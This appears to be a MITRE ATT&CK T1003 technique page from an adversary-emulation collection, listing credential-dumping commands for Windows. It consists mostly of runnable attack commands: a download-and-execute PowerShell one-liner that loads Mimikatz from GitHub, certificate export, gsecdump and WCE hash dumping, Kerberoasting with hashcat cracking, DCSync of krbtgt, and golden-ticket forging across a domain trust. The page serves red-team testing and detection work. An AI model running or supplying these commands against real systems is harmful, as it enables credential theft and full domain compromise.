# Credential Dumping

MITRE ATT&CK Technique: [T1003](https://attack.mitre.org/wiki/Technique/T1003)


## Powershell Mimikatz - Dump Credentials

Input:

    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

## Powershell Mimikatz - Dump Certificates

Input:

    PS> Import-Module Invoke-Mimikatz.ps1 
    Invoke-Mimikatz –command '"privilege::debug"' 
    Invoke-Mimikatz –command '"crypto::capi"' 
    Invoke-Mimikatz –command '"crypto::certificates /export"' 
  
## Gsecdump

[Gsecdump](https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5)

Input:

    gsecdump -a

## Windows Credential Editor

[Windows Credential Editor](http://www.ampliasecurity.com/research/windows-credentials-editor/)

Input:

    wce -o output.txt

Output:

    C:\>wce -o output.txt
    WCE v1.2 (Windows Credentials Editor) - (c) 2010,2011 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
    Use -h for help.

    C:\>type output.txt
    test:AMPLIALABS:01020304050607080900010203040506:98971234567865019812734576890102
    C:\>

## Powershell Mimikatz - Dump Service Account Passwords (Keberoast)

[Powersploit] (https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

Input:

    PS> invoke-kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash <hash>
    
[hashcat] (https://github.com/hashcat/hashcat.git)

    PS> invoke-kerberoast -OutputFormat HashCat | Select-Object -ExpandProperty hash > ./krbtgs-23.txt
    hashcat -m 13100 -a 0 -w 4 --session kerb -o hash.pot --powertune-enable ./krb-tgs-23.txt
    /opt/rockyou.txt -r ./hashcat-3.10/rules/dive.rule

[JohnTheRipper (Magnum Ripper)] (https://github.com/magnumripper/JohnTheRipper)

    PS> invoke-kerberoast -OutputFormat John | Select-Object -ExpandProperty hash
    
## Powershell Mimikatz - Create Golden Ticket on a Parent Domain with a Bi-Directional Trust

[Powersploit] (https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

 #create golden ticket to use  
  
    PS> Import-Module .\Invoke-Mimikatz.ps1 PS> Import-Module .\PowerView.ps1 
    PS> Get-DomainSid  
    PS> Get-NetGroup “Enterprise Admins" -Domain <Domain> <SID> 
    

#Grab the NTLM hash of the krbtgt user for the child domain 
    
    PS> Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<Domain> /user:krbtgt"' f320b90fa9c53969efc61146e77022b5
    

#Try mounting the C$ of the parent domain controller
    
    PS> dir \<Domain Controller>\c$ #Error - access denied
    

#Create a golden ticket for a user on the child domain with enterprise admin rights of the parent domain
   
    PS> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain> /sid:<SID> /krbtgt:<SID> /sids:<SID> /ptt"'
    

#Check administrative access to the parent domain controller
    
    PS> dir \\<Domain Controller>l\c$ #Allowed
    PS> Invoke-WmiMethod -Path Win32_process -Name create -ComputerName <Computer Name> -ArgumentList calc.exe
    

#Run DCSync with mimikatz
    
    PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<username> /domain:<domain>"'
    

#DCSync built-in to Mimikatz
(https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/InvokeDCSync.ps1) 


    PS> Invoke-DCSync –PWDumpFormat 
    
#Create a golden ticket file if needed for backup
    
    PS> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain> /sid:<sid> 
        /krbtgt:f320b90fa9c53963efc61146e77022b5 /sids:<SID>"‘

    PS> Invoke-Mimikatz -Command '"kerberos::ptt ticketname.bin"'
